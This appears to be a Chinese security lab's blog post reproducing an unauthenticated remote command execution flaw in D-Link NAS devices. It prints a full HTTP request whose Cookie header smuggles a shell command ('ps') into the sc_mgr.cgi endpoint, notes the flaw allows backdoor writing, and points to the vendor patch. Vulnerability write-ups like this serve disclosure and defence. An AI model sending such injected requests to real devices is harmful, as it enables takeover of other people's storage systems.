#  【成功复现】D-Link NAS远程命令执行漏洞（Cookie）   
原创 弥天安全实验室  弥天安全实验室   2024-11-20 10:30  
  
网安引领时代，弥天点亮未来     
  
  
  
  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x00写在前面**  
  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
0x01漏洞介绍D-Link DNS-320等都是中国友讯（D-Link）公司的一款NAS（网络附属存储）设备。D-Link NAS设备的/cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info 接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞在cookie中执行任意系统命令，写入后门文件，获取服务器权限。0x02影响版本  
1.D-Link DNS  
0x03漏洞复现  
1.访问漏洞环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hA1IrYe7NqeTx2vhRGiaQYKT08LgmFppRRfk6micOUgaH2h9G2umMhwPsI881ibe5bFiaeyW6WturCYMw/640?wx_fmt=png&from=appmsg "")  
2.对漏洞进行复现 POC 漏洞复现GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0Accept: */*Accept-Encoding: gzip, deflateConnection: closeCookie: username=mitian'& ps & echo 'mitian;      测试执行ps命令，通过响应判断漏洞存在。3.nuclei文件测试0x04修复建议目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://www.dlink.com/弥天简介学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。口号 网安引领时代，弥天点亮未来 知识分享完了喜欢别忘了关注我们哦~学海浩茫，予以风动，必降弥天之润！   弥  天安全实验室  
  
  
